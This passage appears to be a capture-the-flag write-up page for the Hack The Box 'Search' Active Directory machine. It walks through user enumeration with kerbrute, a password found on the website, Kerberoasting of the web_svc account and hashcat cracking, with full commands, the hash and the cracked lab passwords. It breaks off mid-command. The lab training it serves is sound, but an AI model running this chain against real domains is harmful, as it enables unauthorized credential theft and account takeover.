@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Search | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Using username anarchy to generate AD usernames." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-search/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Search" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Using username anarchy to generate AD usernames." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-search/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-search/og.png?v=1045187d" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Search" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Using username anarchy to generate AD usernames." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-search/og.png?v=1045187d" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Search","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Using username anarchy to generate AD usernames.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-search/","datePublished":"2026-05-19","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Search","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-search/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Search</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-05-19 · 13 min read</p><h1>Search</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), HTTP (80), Using username anarchy to generate AD usernames.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Search" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-search.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-search.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Search</h2><p>Search is a hard difficulty Windows machine that focuses on Active Directory enumeration and exploitation techniques. Foothold is obtained by finding exposed credentials in a web page, enumerating AD users, running a Kerberoast attack to obtain a crackable hash for a service…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>18 Dec 2021</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>dmw0ng</dd></div><div><dt>Rating</dt><dd>4.6 / 5</dd></div><div><dt>User owns</dt><dd>2,618</dd></div><div><dt>Root owns</dt><dd>2,392</dd></div><div><dt>User blood</dt><dd>InfoSecJack<small class="room-blood-time">0H 25M 39S</small></dd></div><div><dt>Root blood</dt><dd>xct<small class="room-blood-time">1H 24M 47S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 2616 votes from easiest to hardest"><rect x="0" y="57" width="20" height="7" rx="2" fill="hsl(96 70% 55%)"><title>75 votes</title></rect><rect x="26" y="61" width="20" height="3" rx="2" fill="hsl(96 70% 55%)"><title>32 votes</title></rect><rect x="52" y="54" width="20" height="10" rx="2" fill="hsl(80 70% 55%)"><title>106 votes</title></rect><rect x="78" y="42" width="20" height="22" rx="2" fill="hsl(70 70% 55%)"><title>228 votes</title></rect><rect x="104" y="7" width="20" height="57" rx="2" fill="hsl(50 70% 55%)"><title>601 votes</title></rect><rect x="130" y="18" width="20" height="46" rx="2" fill="hsl(38 70% 55%)"><title>485 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>673 votes</title></rect><rect x="182" y="38" width="20" height="26" rx="2" fill="hsl(16 70% 55%)"><title>271 votes</title></rect><rect x="208" y="57" width="20" height="7" rx="2" fill="hsl(8 70% 55%)"><title>69 votes</title></rect><rect x="234" y="57" width="20" height="7" rx="2" fill="hsl(0 70% 55%)"><title>76 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 8.0, Real-Life 7.2, CVE 5.2, Custom Exploitation 4.8, CTF-Like 2.8"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,54.0 157.9,94.4 131.4,139.4 90.3,137.2 91.4,103.9" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Search" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.229.57 --generate-hosts-file /etc/hosts
+[sudo] password for kali: 
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><ul><li>Windows version tells me this is going to be vulnerable to ZeroLogon</li></ul><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT research.search.htb                                                              
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-19 18:14 +0100
+Nmap scan report for research.search.htb (10.129.229.57)
+Host is up (0.013s latency).
+rDNS record for 10.129.229.57: RESEARCH.search.htb
+Not shown: 65514 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+8172/tcp  open  unknown
+9389/tcp  open  adws
+49667/tcp open  unknown
+49693/tcp open  unknown
+49694/tcp open  unknown
+49710/tcp open  unknown
+49719/tcp open  unknown
+49745/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.28 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 -A --min-rate=2000 -sT research.search.htb
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-19 18:17 +0100
+Nmap scan report for research.search.htb (10.129.229.57)
+Host is up (0.013s latency).
+rDNS record for 10.129.229.57: RESEARCH.search.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: Search &amp;mdash; Just Testing IIS
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-19 17:17:41Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-05-19T17:19:38+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_http-server-header: Microsoft-IIS/10.0
+|_ssl-date: 2026-05-19T17:19:38+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-05-19T17:19:38+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-05-19T17:19:38+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=research
+| Not valid before: 2020-08-11T08:13:35
+|_Not valid after:  2030-08-09T08:13:35
+|_ssl-date: 2026-05-19T17:19:38+00:00; -1s from scanner time.
+8172/tcp open  ssl/unknown
+| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
+| Not valid before: 2020-04-07T09:05:25
+|_Not valid after:  2030-04-05T09:05:25
+|_ssl-date: 2026-05-19T17:19:38+00:00; -1s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><p>Null auth is enabled, but not able to use it to list shares or list users</p><p>Guest account is also disabled!</p><h2>HTTP (80)</h2><p>The website appears to be mostly static</p><p>There is a contact page i can do some testing on</p><p>There is a team page, which could be some potential users</p><p><img src="images/search/pasted-image-20260519182502.webp" alt="Screenshot" loading="lazy" /></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Keely Lyons
+Dax Santiago
+Sierra Frye
+Kyla Stewart
+Kaiara Spencer
+Dave Simpson
+Ben Thompson
+Chris Stewart</code></pre><p>I could try and give these names to username anarchy to generate username variations!</p><h2>Using username anarchy to generate AD usernames</h2><p>So ive put the names i found above into a file called <code>web-users.txt</code></p><p>Then ill give this file to username anarchy</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">./username-anarchy -i ../web-users.txt 
+keely
+keelylyons
+keely.lyons
+keelylyo
+keellyon
+keelyl
+k.lyons
+klyons
+lkeely
+l.keely
+lyonsk
+lyons
+lyons.k
+lyons.keely
+kl
+dax
+daxsantiago
+dax.santiago
+daxsanti
+daxsant
+daxs
+d.santiago
+dsantiago
+
+
+...[SNIP]...</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">kerbrute userenum --dc research.search.htb -d search.htb potential-users.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 05/19/26 - Ronnie Flathers @ropnop
+
+2026/05/19 18:31:53 &gt;  Using KDC(s):
+2026/05/19 18:31:53 &gt;  	research.search.htb:88
+
+2026/05/19 18:31:53 &gt;  [+] VALID USERNAME:	keely.lyons@search.htb
+2026/05/19 18:31:53 &gt;  [+] VALID USERNAME:	dax.santiago@search.htb
+2026/05/19 18:31:53 &gt;  [+] VALID USERNAME:	sierra.frye@search.htb
+2026/05/19 18:31:53 &gt;  Done! Tested 116 usernames (3 valid) in 0.201 seconds</code></pre><p>Kerbrute found 3 valid users, this also gives me a username format!</p><p>None of them are AS-REP roastable and none of have the username as the password</p><h2>Hidden credentials on webserver</h2><p><img src="images/search/pasted-image-20260519195825.webp" alt="Screenshot" loading="lazy" /></p><p>Found a password!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">IsolationIsKey?</code></pre><p>There is also what looks like a username in the image:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hope sharp</code></pre><p>But because of what i already know about the username format i can gather it is <code>hope.sharp</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb research.search.htb -u hope.sharp -p &#39;IsolationIsKey?&#39;        
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey?</code></pre><p>I have compromised this user</p><h2>Access as <code>hope.sharp</code></h2><p>Now i have compromised a user i can start to enumerate the AD environment</p><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb research.search.htb -u hope.sharp -p &#39;IsolationIsKey?&#39; --shares
+SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
+SMB         10.129.229.57   445    RESEARCH         [*] Enumerated shares
+SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
+SMB         10.129.229.57   445    RESEARCH         -----           -----------     ------
+SMB         10.129.229.57   445    RESEARCH         ADMIN$                          Remote Admin
+SMB         10.129.229.57   445    RESEARCH         C$                              Default share
+SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.229.57   445    RESEARCH         helpdesk                        
+SMB         10.129.229.57   445    RESEARCH         IPC$            READ            Remote IPC
+SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share 
+SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRITE      
+SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share</code></pre><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb research.search.htb -u hope.sharp -p &#39;IsolationIsKey?&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 &gt; users.txt</code></pre><p>Ill use this command to output all the user to a full userlist</p><h2>Kerberoasting leads to user compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap research.search.htb -u hope.sharp -p &#39;IsolationIsKey?&#39; --kerberoasting kerb.hash                                                                
+LDAP        10.129.229.57   389    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 (name:RESEARCH) (domain:search.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.229.57   389    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
+LDAP        10.129.229.57   389    RESEARCH         [*] Skipping disabled account: krbtgt
+LDAP        10.129.229.57   389    RESEARCH         [*] Total of records returned 1
+LDAP        10.129.229.57   389    RESEARCH         [*] sAMAccountName: web_svc, memberOf: [], pwdLastSet: 2020-04-09 13:59:11.329031, lastLogon: &lt;never&gt;
+LDAP        10.129.229.57   389    RESEARCH         $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb\web_svc*$be239f268197211ccc4a4386ffc1cada$007c0b253bcf5d9877b827407755c2b6c32cbe0d6b53365197a2fd453264002f2805fd752b7c378c79718ef160d6709e9be8646b5c2d2aeeb6aaf585812f69fa95c2fda7f5a2f6e360921c89843ad29f30aa4cd93a59fa650d69c85ec2072c804776fdfbd6148739dc1ff828d75d2e6439f9f554ccf2105c84ccfdc5be9ed14767ff3d8f0613fae4f803db2d4cc160c2c492bc16a51c654b9278350a5e03a31969433b2d4d0d1b921719765016aa2a1aa5afcab87556bdceed080c7cd378c7b3f9f5672cd4dad6aea7222e86efc01b0b96fb03ede68992bbf47b91cadb21318be6eb49e101a04f7e3376ddba43cd0ffb52102d4561acdbaf0d3828748357f53e838cc6c7d277f19fb6908b3d25ca92093a7a59ca93726b7d29777569f5788d1b7a7e421ee553cbbcd2a3e3754a683dd17e0294f86b4862fc3269b2fa420940cba5d57724d51e1a5969baee9978c8c03552063ecdf639e8ed9685132d22c1eb550275368efee88fd2b798569340a782aaebbc1165bbc51384cceaa2ec2a2e61bb0e1f6bc85dd1461d6f658560881b9a539089bb69989509465f4fdee69be0cb411a152db20d16e3e6c0eefd8faac61b0bb78620e1c269158f3f100bae3aad520c3d6c7c3cc4964ff091190d5a188005434d0d3776dfc008a2312170c53be1874c9a1490207a25fab5af38167e68ea699da6c025bd7ad70f2bbb6bc1c53f60171b25b941dcdce91271098c4bdd2a02db7cec9a7e0e0b1679e588a8718d2098f223275d9918ffb0e42fe737436f1f8fe8140ce141ebd0467f63320843741d7c7f3e47d1e6313dc0a22199b95bfbdd746dde4a11d77896fd02878e8ce24e7e31cf5ce2a6b526859fabd40927917d900c147f6f37c421d7d4275201e329e629180646b91605acee402fff21e8d8d4929901ad3ff2c462bb5e5beb9bbf97a89f29705ff414f72fde9f13addb31d29110821e837c4ba4b7b680029435067856f0efd4f066824b0f072cf8a4f03815fb5e909c7f9d0f4ad15b2a7f03b576d7d0f8e866027a1a88492245a33ddd3a5890a3822189a41b35b28a4c2d8f0045119d0821077f1e0b9121602724e1e0ffae9580852058358a650b0a0176e4d1b22aa0445247161185a0b434c205d480ea1afed7df74ee602aae6df850cf478384daa55f6f94004b9f2a8df91f3b71639a9498e0394d4c25090ec273f969470bae755c6cc5a479d153f9db1c3e4d7f1de83ed444f0631365ef4b60c8ff985d0d071fd93cfd3bde5ff3448ecc93d1398cea8cf5859223f021b816d867e67c2f0d68d2a8f0ad5f0e3777810d302069284813696f0a6323f892da36dca543091205edb9909edb3530f799184db637ecbc0f99a40acafc6951ef8d323dfcf403fdeaff29495130e92fcdcc7fe04bfc72ebc17ed08944818e46dafbc1895c09e74a9f6265cd08849d70b08279f4a8fa3c2c4683dd059240f8d21793049a57</code></pre><p>Found a hash for the user <code>web_svc</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat kerb.hash /usr/share/wordlists/rockyou.txt
+
+$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb\web_svc*$be239f268197211ccc4a4386ffc1cada$007c0b253bcf5d9877b827407755c2b6c32cbe0d6b53365197a2fd453264002f2805fd752b7c378c79718ef160d6709e9be8646b5c2d2aeeb6aaf585812f69fa95c2fda7f5a2f6e360921c89843ad29f30aa4cd93a59fa650d69c85ec2072c804776fdfbd6148739dc1ff828d75d2e6439f9f554ccf2105c84ccfdc5be9ed14767ff3d8f0613fae4f803db2d4cc160c2c492bc16a51c654b9278350a5e03a31969433b2d4d0d1b921719765016aa2a1aa5afcab87556bdceed080c7cd378c7b3f9f5672cd4dad6aea7222e86efc01b0b96fb03ede68992bbf47b91cadb21318be6eb49e101a04f7e3376ddba43cd0ffb52102d4561acdbaf0d3828748357f53e838cc6c7d277f19fb6908b3d25ca92093a7a59ca93726b7d29777569f5788d1b7a7e421ee553cbbcd2a3e3754a683dd17e0294f86b4862fc3269b2fa420940cba5d57724d51e1a5969baee9978c8c03552063ecdf639e8ed9685132d22c1eb550275368efee88fd2b798569340a782aaebbc1165bbc51384cceaa2ec2a2e61bb0e1f6bc85dd1461d6f658560881b9a539089bb69989509465f4fdee69be0cb411a152db20d16e3e6c0eefd8faac61b0bb78620e1c269158f3f100bae3aad520c3d6c7c3cc4964ff091190d5a188005434d0d3776dfc008a2312170c53be1874c9a1490207a25fab5af38167e68ea699da6c025bd7ad70f2bbb6bc1c53f60171b25b941dcdce91271098c4bdd2a02db7cec9a7e0e0b1679e588a8718d2098f223275d9918ffb0e42fe737436f1f8fe8140ce141ebd0467f63320843741d7c7f3e47d1e6313dc0a22199b95bfbdd746dde4a11d77896fd02878e8ce24e7e31cf5ce2a6b526859fabd40927917d900c147f6f37c421d7d4275201e329e629180646b91605acee402fff21e8d8d4929901ad3ff2c462bb5e5beb9bbf97a89f29705ff414f72fde9f13addb31d29110821e837c4ba4b7b680029435067856f0efd4f066824b0f072cf8a4f03815fb5e909c7f9d0f4ad15b2a7f03b576d7d0f8e866027a1a88492245a33ddd3a5890a3822189a41b35b28a4c2d8f0045119d0821077f1e0b9121602724e1e0ffae9580852058358a650b0a0176e4d1b22aa0445247161185a0b434c205d480ea1afed7df74ee602aae6df850cf478384daa55f6f94004b9f2a8df91f3b71639a9498e0394d4c25090ec273f969470bae755c6cc5a479d153f9db1c3e4d7f1de83ed444f0631365ef4b60c8ff985d0d071fd93cfd3bde5ff3448ecc93d1398cea8cf5859223f021b816d867e67c2f0d68d2a8f0ad5f0e3777810d302069284813696f0a6323f892da36dca543091205edb9909edb3530f799184db637ecbc0f99a40acafc6951ef8d323dfcf403fdeaff29495130e92fcdcc7fe04bfc72ebc17ed08944818e46dafbc1895c09e74a9f6265cd08849d70b08279f4a8fa3c2c4683dd059240f8d21793049a57:@3ONEmillionbaby</code></pre><p>The hash cracked!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">web_svc:@3ONEmillionbaby</code></pre><p>Ill verify these credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb research.search.htb -u web_svc -p &#39;@3ONEmillionbaby&#39;                                                                                       
